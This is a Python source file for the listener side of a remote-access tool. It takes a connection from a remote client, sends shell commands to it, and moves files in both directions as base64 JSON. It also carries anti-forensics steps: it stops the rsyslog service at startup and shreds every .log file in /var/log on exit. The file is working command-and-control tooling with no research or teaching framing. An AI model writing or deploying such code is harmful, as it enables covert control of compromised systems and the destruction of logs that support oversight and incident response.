#!/usr/bin/python3.9
# server file
# LinuxOS
import socket
import os
import sys
import getopt
import subprocess
import json
import base64
class Listen(object):
    def __init__(self,target,port):
        subprocess.call('service rsyslog stop',shell=True)
        self.target=target;
        self.port=port
        self.conn=None
        self.add=None
        self.f=True
        self.__sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.__sock.bind((self.target,self.port))
            self.__sock.listen(0)
        except:
            raise Exception("Port is not accessible try another one or exit")
        print("[+] Waiting for a connection in port {self.port}")
        self.conn,self.add=self.__sock.accept()
        print(f"[+] Connection recieved from {self.add[0]} through port {self.add[1]}")
    def __send_data(self,msg):
        if not self.f:
            self.wait()
        try:
            msg=json.dumps(msg)
        except:
            print("Problem in Sending Data")
            msg=json.dumps({'msg':'Error'})
        self.conn.send(msg.encode())
    def __download(self,data):
        try:
            name=data.get("name")
            byte=base64.b64decode(data.get('byt').encode())
            if not byte:
                print("NO data from file ")
                return
            with open(name,'wb') as f:
                f.write(byte)
            print("File is downloaded");
            
        except:
            print("Problem in downloading File")
        return;
    def __upload(self,filename):
        ok=None
         # commnet
        msg={'msg':'ALERT','name':filename,'byt':'','first':'upload'}
        try:
            with open(filename,'rb') as f:
                ok=f.read()
            msg['byt']=base64.b64encode(ok).decode()
            print("File Will be uploaded")
        except:
            print("File can't be uploaded")
        self.__send_data(msg)
        return;
    def __exec_command(self,msg):
        ok=subprocess.check_output(msg,shell=True,stdin=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        assert(type(ok)!=type('as'))
        return ok.decode()
    def __rec(self,code=4096):
        res=self.conn.recv(code)
        result=json.loads(res.decode())
        if result.get('msg')==None:
            return "Nothing is sent from client";
        return result;
    def close(self):
        self.__sock.close()
        self.conn.close()
    def deleteEV(self):
        ''' Extra Measures '''
        for i in os.listdir('/var/log'):
            exts=os.path.splitext(i);
            if '.log' in exts:
                subprocess.call(f'shred -n 15 {os.path.join("/var/log/",i)}',shell=True)
        print('[+] logs are cleared ')
    def run(self):
        done=False
        while not done:
            cmmd=input(">> ")
            if cmmd=='exit':
                print('[+] CLosing all open socket')
                self.close()
                self.deleteEV()
                print('[+] Quiting#####')
                sys.exit(0)
            cmmd_L=cmmd.strip().split()
            leng=cmmd_L.__len__()
            main_c=cmmd_L[0]
            other=None
            if leng>1:
                other=cmmd_L[1]
            if leng==1:
                msg={'msg':main_c}
                self.__send_data(msg)
                res=self.__rec()
                if isinstance(res,str):
                    print("Error")
                else:
                    print(res.get('msg'))
            elif main_c.lower()=='cd':
                msg={'first':main_c,'msg':other}
                self.__send_data(msg)
                res=self.__rec()
                if isinstance(res,str):
                    print("Error")
                else:
                    print(res.get('msg'))
            elif main_c.lower()=="download":
                msg={'first':'download','msg':other}
                self.__send_data(msg)
                pp=self.__rec()
                print(pp)
                if isinstance(pp,str):
                    print("Cant be downloaded")
                else:
                    self.__download(pp)
            elif main_c.lower()=="upload" or main_c.lower()=='up':
                self.__upload(other)
                res=self.__rec()
                if isinstance(res,str):
                    print("Error")
                else:
                    print(res.get('msg'))
            else:
                op={'msg':cmmd}
                self.__send_data(op)
                res=self.__rec()
                if isinstance(res,str):
                    print("Error")
                else:
                    print(res.get('msg'))
if __name__=="__main__":
    opts,args=getopt.getopt(sys.argv[1:],"lt:p:",['--listen','--target','--port'])
    listen=False
    target=None
    port=None
    for a,b in opts:
        if a=='-l':
            listen=True
        elif a=='-t':
            target=b
        elif a=='-p':
            port=int(b)
    listener=Listen(target,port)
    try:
        listener.run()
    except KeyboardInterrupt:
        print("[+] Closing all open sockets")
        self.close()
        self.deleteEV()
        print("Quiting####")
        sys.exit(0)
    
                
                
                    
                
            
                
    
            
        
        
            

    
